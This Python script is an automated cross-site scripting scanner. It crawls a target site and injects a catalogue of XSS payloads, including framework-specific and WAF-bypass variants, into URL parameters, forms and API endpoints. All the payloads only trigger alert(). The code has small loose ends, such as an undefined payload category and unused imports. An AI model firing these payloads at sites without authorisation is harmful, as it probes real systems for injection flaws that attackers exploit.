#!/usr/bin/env python3
"""
Advanced XSS Scanner - Like xss0r.com
Professional-grade XSS scanner with advanced features
Author: AI Assistant
Version: 2.0 Advanced
"""

import requests
import re
import urllib.parse
import time
import os
import json
import base64
import html
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
import argparse

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

class AdvancedXSSScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Advanced payloads by context and framework
        self.advanced_payloads = {
            'html': [
                '<script>alert("XSS_ADVANCED")</script>',
                '<img src=x onerror=alert("XSS_ADVANCED")>',
                '<svg onload=alert("XSS_ADVANCED")>',
                '<iframe src="javascript:alert(\'XSS_ADVANCED\')">',
                '<body onload=alert("XSS_ADVANCED")>',
                '<details ontoggle=alert("XSS_ADVANCED")>',
                '<marquee onstart=alert("XSS_ADVANCED")>',
                '<video><source onerror=alert("XSS_ADVANCED")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS_ADVANCED\')" x="',
                "' onmouseover='alert(\"XSS_ADVANCED\")' x='",
                '" onfocus="alert(\'XSS_ADVANCED\')" autofocus="',
                "' onfocus='alert(\"XSS_ADVANCED\")' autofocus='",
                '" onload="alert(\'XSS_ADVANCED\')" x="'
            ],
            'javascript': [
                ';alert("XSS_ADVANCED");//',
                '";alert("XSS_ADVANCED");//',
                "';alert('XSS_ADVANCED');//",
                '}alert("XSS_ADVANCED");//',
                ']alert("XSS_ADVANCED");//'
            ],
            'css': [
                ';color:red;background:url("javascript:alert(\'XSS_ADVANCED\')");',
                ';color:red;background:expression(alert("XSS_ADVANCED"));',
                ';color:red;background:url("data:text/javascript,alert(\'XSS_ADVANCED\')");'
            ],
            'url': [
                'javascript:alert("XSS_ADVANCED")',
                'data:text/html,<script>alert("XSS_ADVANCED")</script>',
                'vbscript:alert("XSS_ADVANCED")'
            ],
            'react': [
                '{{constructor.constructor("alert(\\"XSS_REACT_ADVANCED\\")")()}}',
                '{alert("XSS_REACT_ADVANCED")}',
                '${alert("XSS_REACT_ADVANCED")}',
                '<script dangerouslySetInnerHTML={{__html: "alert(\\"XSS_REACT_ADVANCED\\")"}}>'
            ],
            'vue': [
                '{{constructor.constructor("alert(\\"XSS_VUE_ADVANCED\\")")()}}',
                '{alert("XSS_VUE_ADVANCED")}',
                'v-on:click="alert(\'XSS_VUE_ADVANCED\')"',
                'v-bind:onclick="alert(\'XSS_VUE_ADVANCED\')"'
            ],
            'angular': [
                '{{constructor.constructor("alert(\\"XSS_ANGULAR_ADVANCED\\")")()}}',
                '{alert("XSS_ANGULAR_ADVANCED")}',
                '(click)="alert(\'XSS_ANGULAR_ADVANCED\')"',
                '[innerHTML]="alert(\'XSS_ANGULAR_ADVANCED\')"'
            ],
            'waf_bypass': [
                '<script>alert(String.fromCharCode(88,83,83,95,87,65,70))</script>',
                '<img src=x onerror=alert(String.fromCharCode(88,83,83,95,87,65,70))>',
                '<svg onload=alert(String.fromCharCode(88,83,83,95,87,65,70))>',
                '<iframe src="data:text/html,<script>alert(String.fromCharCode(88,83,83,95,87,65,70))</script>">'
            ],
            'encoded': [
                '%3Cscript%3Ealert%28%22XSS_ENCODED%22%29%3C%2Fscript%3E',
                '&lt;script&gt;alert(&quot;XSS_ENCODED&quot;)&lt;/script&gt;',
                '&#60;script&#62;alert&#40;&#34;XSS_ENCODED&#34;&#41;&#60;/script&#62;',
                '\\x3Cscript\\x3Ealert\\x28\\x22XSS_ENCODED\\x22\\x29\\x3C/script\\x3E'
            ]
        }
        
        self.vulnerabilities = []
        self.browser = None
        self.playwright = None
        self.browser_context = None
        
        # Create directories
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('reports', exist_ok=True)
    
    def log(self, message, level="INFO"):
        """Enhanced logging"""
        colors = {
            "INFO": "\033[0m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "VULN": "\033[92m\033[1m",
            "DETECTION": "\033[96m\033[1m",
            "SCANNING": "\033[95m\033[1m",
            "ALERT": "\033[91m\033[1m"
        }
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, '')}[{timestamp}] [{level}] {message}\033[0m")
    
    def detect_technology(self):
        """Advanced technology detection"""
        self.log("🔍 Detecting website technology...", "DETECTION")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            
            html_content = response.text
            technology_info = {
                'type': 'traditional',
                'frameworks': [],
                'features': [],
                'confidence': 0
            }
            
            # Detect frameworks
            if 'react' in html_content.lower() or 'data-reactroot' in html_content:
                technology_info['frameworks'].append('React')
                technology_info['confidence'] += 30
            
            if 'vue' in html_content.lower() or 'vue.js' in html_content.lower():
                technology_info['frameworks'].append('Vue.js')
                technology_info['confidence'] += 30
            
            if 'angular' in html_content.lower() or 'ng-app' in html_content.lower():
                technology_info['frameworks'].append('Angular')
                technology_info['confidence'] += 30
            
            # Detect SPA features
            spa_indicators = ['history.pushState', 'router', 'fetch(', 'axios', 'XMLHttpRequest']
            for indicator in spa_indicators:
                if indicator in html_content:
                    technology_info['features'].append('SPA')
                    technology_info['confidence'] += 10
                    break
            
            # Determine type
            if technology_info['confidence'] >= 50:
                technology_info['type'] = 'modern_spa'
            elif technology_info['confidence'] >= 20:
                technology_info['type'] = 'hybrid'
            
            self.log(f"Technology: {technology_info['type']}", "DETECTION")
            self.log(f"Frameworks: {', '.join(technology_info['frameworks']) if technology_info['frameworks'] else 'None'}", "DETECTION")
            self.log(f"Features: {', '.join(technology_info['features']) if technology_info['features'] else 'None'}", "DETECTION")
            self.log(f"Confidence: {technology_info['confidence']}/100", "DETECTION")
            
            return technology_info
            
        except Exception as e:
            self.log(f"Technology detection failed: {str(e)}", "ERROR")
            return {'type': 'traditional', 'frameworks': [], 'features': [], 'confidence': 0}
    
    def advanced_reconnaissance(self):
        """Advanced reconnaissance"""
        self.log("🔍 Starting advanced reconnaissance...", "SCANNING")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            
            html_content = response.text
            
            # Extract URLs using regex (no external dependencies)
            urls = set()
            urls.add(self.target_url)
            
            # Extract links
            link_pattern = r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>'
            matches = re.findall(link_pattern, html_content, re.IGNORECASE)
            
            for match in matches:
                if match and not match.startswith('#') and not match.startswith('javascript:'):
                    full_url = urljoin(self.target_url, match)
                    if self._is_same_domain(full_url):
                        urls.add(full_url)
            
            # Extract forms
            forms = []
            form_pattern = r'<form[^>]*>(.*?)</form>'
            form_matches = re.findall(form_pattern, html_content, re.IGNORECASE | re.DOTALL)
            
            for form_html in form_matches:
                form_data = self._parse_form(form_html)
                if form_data:
                    forms.append(form_data)
            
            # Extract API endpoints
            api_endpoints = set()
            api_patterns = [
                r'fetch\(["\']([^"\']+)["\']',
                r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
                r'/api/[^"\']+',
                r'/v\d+/[^"\']+',
                r'/graphql'
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, html_content, re.IGNORECASE)
                for match in matches:
                    if match:
                        full_url = urljoin(self.target_url, match)
                        if self._is_same_domain(full_url):
                            api_endpoints.add(full_url)
            
            # Extract parameters
            url_parameters = set()
            for url in urls:
                parsed_url = urlparse(url)
                params = set(parse_qs(parsed_url.query).keys())
                url_parameters.update(params)
            
            self.log(f"Discovered {len(urls)} URLs", "SUCCESS")
            self.log(f"Found {len(forms)} forms", "SUCCESS")
            self.log(f"Found {len(api_endpoints)} API endpoints", "SUCCESS")
            self.log(f"Found {len(url_parameters)} URL parameters", "SUCCESS")
            
            return {
                'urls': list(urls),
                'forms': forms,
                'api_endpoints': list(api_endpoints),
                'url_parameters': list(url_parameters)
            }
            
        except Exception as e:
            self.log(f"Reconnaissance failed: {str(e)}", "ERROR")
            return None
    
    def _parse_form(self, form_html):
        """Parse form HTML"""
        try:
            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ''
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else 'GET'
            
            # Extract inputs
            inputs = []
            input_pattern = r'<(?:input|textarea|select)[^>]*>'
            input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)
            
            for input_html in input_matches:
                name_match = re.search(r'name=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']+)["\']', input_html, re.IGNORECASE)
                value_match = re.search(r'value=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                
                if name_match:
                    inputs.append({
                        'name': name_match.group(1),
                        'type': type_match.group(1) if type_match else 'text',
                        'value': value_match.group(1) if value_match else ''
                    })
            
            if inputs:
                return {
                    'action': urljoin(self.target_url, action) if action else self.target_url,
                    'method': method,
                    'inputs': inputs
                }
        except Exception as e:
            self.log(f"Form parsing error: {str(e)}", "ERROR")
        
        return None
    
    def _is_same_domain(self, url):
        """Check if URL is from same domain"""
        try:
            target_domain = urlparse(self.target_url).netloc
            url_domain = urlparse(url).netloc
            return target_domain == url_domain
        except:
            return False
    
    def advanced_xss_testing(self, recon_data, technology_info):
        """Advanced XSS testing"""
        self.log("🎯 Starting advanced XSS testing...", "SCANNING")
        
        vulnerabilities = []
        
        # Select appropriate payloads based on technology
        if technology_info['type'] == 'modern_spa':
            payload_categories = ['react', 'vue', 'angular', 'dom_based', 'waf_bypass']
        elif technology_info['type'] == 'hybrid':
            payload_categories = ['html', 'attribute', 'javascript', 'react', 'vue', 'waf_bypass']
        else:
            payload_categories = ['html', 'attribute', 'javascript', 'css', 'url', 'waf_bypass']
        
        # Test URL parameters
        for url in recon_data['urls']:
            parsed_url = urlparse(url)
            url_params = parse_qs(parsed_url.query)
            
            for param_name in url_params:
                self.log(f"Testing URL parameter: {param_name}", "SCANNING")
                
                for category in payload_categories:
                    if category in self.advanced_payloads:
                        for payload in self.advanced_payloads[category]:
                            vuln = self._test_url_parameter(url, param_name, payload, category)
                            if vuln:
                                vulnerabilities.append(vuln)
                                self.log(f"✅ XSS FOUND! {param_name} - {category}", "VULN")
                                break
        
        # Test form parameters
        for form in recon_data['forms']:
            for input_field in form['inputs']:
                if input_field['name']:
                    self.log(f"Testing form parameter: {input_field['name']}", "SCANNING")
                    
                    for category in payload_categories:
                        if category in self.advanced_payloads:
                            for payload in self.advanced_payloads[category]:
                                vuln = self._test_form_parameter(form, input_field['name'], payload, category)
                                if vuln:
                                    vulnerabilities.append(vuln)
                                    self.log(f"✅ XSS FOUND! {input_field['name']} - {category}", "VULN")
                                    break
        
        # Test API endpoints
        if recon_data['api_endpoints']:
            self.log("Testing API endpoints...", "SCANNING")
            for endpoint in recon_data['api_endpoints']:
                for category in payload_categories:
                    if category in self.advanced_payloads:
                        for payload in self.advanced_payloads[category]:
                            vuln = self._test_api_endpoint(endpoint, payload, category)
                            if vuln:
                                vulnerabilities.append(vuln)
                                self.log(f"✅ API XSS FOUND! {endpoint} - {category}", "VULN")
                                break
        
        return vulnerabilities
    
    def _test_url_parameter(self, url, param_name, payload, category):
        """Test URL parameter for XSS"""
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            response = self.session.get(test_url, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS' in payload:
                return {
                    'type': 'reflected_xss',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'category': category,
                    'confidence': 'high'
                }
        
        except Exception as e:
            self.log(f"Error testing URL parameter: {str(e)}", "ERROR")
        
        return None
    
    def _test_form_parameter(self, form, param_name, payload, category):
        """Test form parameter for XSS"""
        try:
            form_data = {}
            for field in form['inputs']:
                if field['name'] == param_name:
                    form_data[field['name']] = payload
                else:
                    form_data[field['name']] = field['value']
            
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            else:
                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS' in payload:
                return {
                    'type': 'reflected_xss',
                    'url': form['action'],
                    'parameter': param_name,
                    'payload': payload,
                    'category': category,
                    'method': form['method'],
                    'confidence': 'high'
                }
        
        except Exception as e:
            self.log(f"Error testing form parameter: {str(e)}", "ERROR")
        
        return None
    
    def _test_api_endpoint(self, endpoint, payload, category):
        """Test API endpoint for XSS"""
        try:
            # Test GET request
            test_url = f"{endpoint}?test={urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS' in payload:
                return {
                    'type': 'api_xss',
                    'url': test_url,
                    'parameter': 'test',
                    'payload': payload,
                    'category': category,
                    'method': 'GET',
                    'confidence': 'high'
                }
        
        except Exception as e:
            self.log(f"Error testing API endpoint: {str(e)}", "ERROR")
        
        return None
    
    def generate_advanced_report(self, vulnerabilities, technology_info):
        """Generate advanced HTML report"""
        self.log("📊 Generating advanced report...", "SUCCESS")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join('reports', f'advanced_xss_report_{timestamp}.html')
        
        total_vulns = len(vulnerabilities)
        categories = {}
        for vuln in vulnerabilities:
            cat = vuln.get('category', 'unknown')
            categories[cat] = categories.get(cat, 0) + 1
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Advanced XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; }}
        .container {{ max-width: 1200px; margin: 20px auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .tech-info {{ background: #f8f9fa; padding: 20px; border-left: 5px solid #17a2b8; margin: 20px; border-radius: 8px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 30px; }}
        .stat {{ background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }}
        .vulnerability {{ background: #f8f9fa; border-left: 5px solid #28a745; margin: 20px; padding: 25px; border-radius: 8px; }}
        .payload-display {{ background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }}
        .category-badge {{ background: #007bff; color: white; padding: 3px 8px; border-radius: 10px; font-size: 0.8em; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Advanced XSS Scanner Report</h1>
            <p>Target: {self.target_url}</p>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="tech-info">
            <h3>🔍 Technology Detection Results</h3>
            <p><strong>Website Type:</strong> {technology_info['type'].upper()}</p>
            <p><strong>Frameworks:</strong> {', '.join(technology_info['frameworks']) if technology_info['frameworks'] else 'None'}</p>
            <p><strong>Features:</strong> {', '.join(technology_info['features']) if technology_info['features'] else 'None'}</p>
            <p><strong>Confidence:</strong> {technology_info['confidence']}/100</p>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">{total_vulns}</div>
                <div>Total Vulnerabilities</div>
            </div>
            <div class="stat">
                <div class="stat-number">{len(categories)}</div>
                <div>Payload Categories</div>
            </div>
        </div>
        
        <div style="padding: 30px;">
            <h2>🎯 Vulnerability Details</h2>
"""
        
        if not vulnerabilities:
            html_content += '<div style="text-align: center; padding: 40px; color: #28a745; font-size: 1.2em;">✅ No vulnerabilities found</div>'
        else:
            for i, vuln in enumerate(vulnerabilities, 1):
                html_content += f"""
                <div class="vulnerability">
                    <h3>🔍 Vulnerability #{i} 
                        <span class="category-badge">{vuln.get('category', 'unknown').upper()}</span>
                    </h3>
                    <p><strong>Type:</strong> {vuln.get('type', 'unknown')}</p>
                    <p><strong>URL:</strong> {vuln.get('url', 'unknown')}</p>
                    <p><strong>Parameter:</strong> {vuln.get('parameter', 'unknown')}</p>
                    <p><strong>Payload:</strong></p>
                    <div class="payload-display">{html.escape(vuln.get('payload', 'unknown'))}</div>
                    <p><strong>Method:</strong> {vuln.get('method', 'GET')}</p>
                    <p><strong>Confidence:</strong> {vuln.get('confidence', 'unknown')}</p>
                </div>
"""
        
        html_content += """
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"Advanced report generated: {report_path}", "SUCCESS")
            return report_path
            
        except Exception as e:
            self.log(f"Error generating report: {str(e)}", "ERROR")
            return None
    
    def scan(self):
        """Main scanning method"""
        self.log("🚀 Starting Advanced XSS Scanner v2.0", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        self.log("=" * 80, "SUCCESS")
        
        try:
            # Phase 1: Technology Detection
            technology_info = self.detect_technology()
            
            # Phase 2: Advanced Reconnaissance
            recon_data = self.advanced_reconnaissance()
            if not recon_data:
                return []
            
            # Phase 3: Advanced XSS Testing
            vulnerabilities = self.advanced_xss_testing(recon_data, technology_info)
            
            # Phase 4: Generate Report
            report_path = self.generate_advanced_report(vulnerabilities, technology_info)
            
            # Phase 5: Show Results
            self._show_results(vulnerabilities)
            
            return vulnerabilities
            
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
            return []
    
    def _show_results(self, vulnerabilities):
        """Show scan results"""
        self.log("=" * 80, "SUCCESS")
        self.log("SCAN RESULTS", "SUCCESS")
        self.log("=" * 80, "SUCCESS")
        
        total_vulns = len(vulnerabilities)
        self.log(f"Total vulnerabilities: {total_vulns}", "SUCCESS")
        
        if vulnerabilities:
            categories = {}
            for vuln in vulnerabilities:
                cat = vuln.get('category', 'unknown')
                categories[cat] = categories.get(cat, 0) + 1
            
            self.log("Vulnerabilities by category:", "SUCCESS")
            for category, count in categories.items():
                self.log(f"  {category}: {count}", "SUCCESS")
            
            self.log("\nDetailed vulnerabilities:", "VULN")
            for i, vuln in enumerate(vulnerabilities, 1):
                self.log(f"  {i}. {vuln.get('type', 'unknown')} - {vuln.get('parameter', 'unknown')} - {vuln.get('category', 'unknown')}", "VULN")
        else:
            self.log("No vulnerabilities found", "INFO")

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner v2.0')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    scanner = AdvancedXSSScanner(args.url, args.timeout)
    scanner.scan()

if __name__ == "__main__":
    main()